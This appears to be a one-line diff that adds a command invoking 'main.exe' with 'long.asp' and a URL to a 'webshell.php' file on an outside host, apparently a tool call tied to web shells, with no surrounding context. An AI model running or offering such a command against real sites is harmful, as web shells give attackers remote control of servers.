@@ -1,0 +1,1 @@
+main.exe long.asp long http://www.webscan1989.us/webshell.php
